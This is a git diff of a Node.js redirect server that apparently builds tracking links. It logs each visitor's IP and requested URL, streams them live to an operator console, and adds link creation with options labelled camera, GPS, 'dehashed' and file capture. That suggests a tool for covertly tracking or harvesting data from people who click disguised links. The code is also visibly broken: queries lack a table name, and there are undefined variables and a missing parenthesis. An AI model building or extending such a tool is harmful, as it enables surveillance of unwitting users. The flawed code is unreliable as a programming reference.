@@ -7,7 +7,7 @@ const fs        = require("fs")
 const ejs       = require("ejs")
 const {con}     = require("./conf/mysql.js")
 const socketIO  = require("socket.io")
-
+const {v4: uuidv4} = require("uuid")
 
 
 const CONF = JSON.parse( fs.readFileSync("./conf.json") )
@@ -25,10 +25,10 @@ http.createServer(redirectApp).listen(CONF.redirect.port)
 
 let server = http.createServer(consoleApp).listen(CONF.console.port)
 //socket IO
-let io = socketIO.listen(server)
+let io = socketIO(server)
 
 
-checkValide(url)
+function checkValide(url)
 {
   let date = new Date(url)
   return ( Date.now() - date ) 
@@ -46,9 +46,9 @@ function getLinks(req){
 
     console.log(`NEW USER IP => ${requestIp.getClientIp(req)} IS LANDING ON PAGE => ${req.url}`)
 
-    io.emit("NewConnection", {ip: requestIp.getClientIp(req), url: req.originalUrl})
+    
 
-    con.query("SELECT TO_URL FROM WHERE FROM_URL=?", req.path, (err, result, fields)=>{
+    con.query("SELECT TO_URL, UUID FROM WHERE FROM_URL=?", req.path, (err, result, fields)=>{
       
       //ERROR CHECK
       if(err){reject( {err: "error not url found"})}
@@ -62,6 +62,8 @@ function getLinks(req){
       let url = `http://${CONF.console.host}:${CONF.console.port}/send/${result.UUID}`
       options.sendLinks = url
       
+      io.emit(result.UUID + "Connection", {ip: requestIp.getClientIp(req), url: req.originalUrl})
+
       resolve(options)
     })
 
@@ -71,7 +73,7 @@ function getLinks(req){
 }
 
 
-redirectApp.use(async (req, res)=>{
+redirectApp.all(async (req, res)=>{
   try{
     let options = await getLinks(req)
     
@@ -94,13 +96,16 @@ consoleApp.use(express.json({limit: "10mB"}))
 consoleApp.use(express.urlencoded({extended: true}))
 consoleApp.use(requestIp.mw())
 
+//pour les fichier static
+consoleApp.use("/static", express.static("public"))
+
 function pushNewUser(user)
 {
   return new Promise((resolve, reject)=>{     
 
     con.query("INSERT INTO user SET ?", user, (err)=>{
       if(err){reject({err: err})}
-      io.emit("newUserInfo", user)
+      io.emit(user.UUID + "Info", user)
       resolve("ok")
     })
 
@@ -165,6 +170,7 @@ function getByUUID()
     con.query("SELECT * FROM redirect", (err, result, fields)=>{
       if(err){reject({err: "bad request"})}
       if(!result.lenght){reject({err: "error"})}
+      resolve(result)
     })
   })
 }
@@ -174,7 +180,7 @@ function getByUUID()
 consoleApp.get("/HOME", checkIp, async (req, res)=>{
     try{
         let result = await getByUUID()
-        res.render("home.ejs", result)
+        res.render("home.ejs", {all: result})
     }
     catch(err){
       err = err.err || "error please try again"
@@ -183,6 +189,85 @@ consoleApp.get("/HOME", checkIp, async (req, res)=>{
   }
 )
 
+//create
+consoleApp.get("/create", checkIp, async(req, res)=>{
+  res.setHeader("Content-Type", "text/html")
+  res.status(200)
+  res.sendFile(__dirname + "/html/create.html")
+})
 
-consoleApp.get("")
-consoleApp.post("")
+
+/*
+
+
+
+
+
+{
+  L_Link: 'http://test.com',
+  L_CustomURL: '/tes/test',
+  L_Time: '25',
+  L_cam: 'on',
+  L_gps: 'on',
+  L_dehashed: 'on',
+  L_file: 'on'
+}
+
+
+*/
+
+function createUrl(options)
+{
+  return new Promise((resolve, reject)=>{
+    let insert = {
+        FROM_URL  : options.CustomURL,
+        TO_URL    : options.Link,
+        ENDTIME   : options.Time,
+        UUID      : uuidv4(),
+    }
+
+    con.query("INSERT INTO redirect SET ?", insert, (err)=>{
+      if(err){reject({err: "please try again"})}
+      resolve(insert.UUID)
+    })
+  }
+
+}
+
+consoleApp.post("/create/links", checkIp, async(req)=>{
+    try{
+      if(!L_Link || !L_CustomURL)
+        {throw {err: "bad request"}}
+
+      if(!req.body.L_Time)
+      {
+        let date = new Date()
+
+        date.setDate(date.getDate() + req.body.L_Time)
+      }
+
+        let create = {
+          Link: req.body.L_Link,
+          CustomURL: req.body.CustomURL,
+          Time: date,
+          options: {
+            cam: req.body.L_came ? True : False,
+            gps: req.body.L_gps  ? True : False,
+            dehashed: req.body.L_dehashed  ? True : False,
+            file: req.body.file  ? True : False,
+          }
+
+         }
+
+         let UUID = await createUrl(options)
+
+         res.render("YourCode.ejs")
+
+    }
+    catch(err){
+      err = err || "please try again"
+      res.status(500).json({err: err})
+    }
+})
+
+
